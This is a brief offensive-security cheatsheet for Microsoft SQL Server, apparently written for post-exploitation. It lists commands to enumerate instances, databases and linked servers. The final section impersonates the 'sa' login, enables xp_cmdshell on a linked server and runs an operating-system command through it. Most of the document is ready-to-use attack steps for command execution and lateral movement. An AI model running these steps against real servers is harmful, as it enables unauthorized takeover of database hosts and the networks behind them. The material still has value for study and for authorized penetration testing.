# MSSQL Cheatsheet

PE can use `PowerUpSQL.ps1` in post exp.

## list sqlserver

```powershell
PS C:\mane> sqlcmd -L

Servers:
    ;UID:Login ID=?;PWD:Password=?;Trusted_Connection:Use Integrated Security=?;*APP:AppName=?;*WSID:WorkStation ID=?;


# OR
PS C:\mane> Get-SqlInstance
```

## Query

```powershell
PS C:\mane> sqlcmd -q "SELECT @@version"
``

```sql
# List Databases
"SELECT name FROM master..sysdatabases;"

```

## Check server link

```
EXEC sp_linkedservers;

select * from openquery("WEB\CLIENTS", 'SELECT name FROM master..sysdatabases;')
```


## Connect Server link

```
EXECUTE AS LOGIN  = 'sa';

EXECUTE ('SELECT @@servername;') at [SQLSERVER2] ;
```


## Enable xpshell to linking server

```
EXECUTE AS LOGIN  = 'sa';
EXECUTE ('EXEC sp_configure ''Show Advanced Options'', 1') at [SQLSERVER2] ;
EXECUTE ('RECONFIGURE') at [SQLSERVER2] ;
EXECUTE ('EXEC sp_configure ''xp_cmdshell'', 1') at [SQLSERVER2];
EXECUTE ('RECONFIGURE') at [SQLSERVER2] ;
EXECUTE ('EXEC master..xp_cmdshell ''whoami''') at [SQLSERVER2] ;
```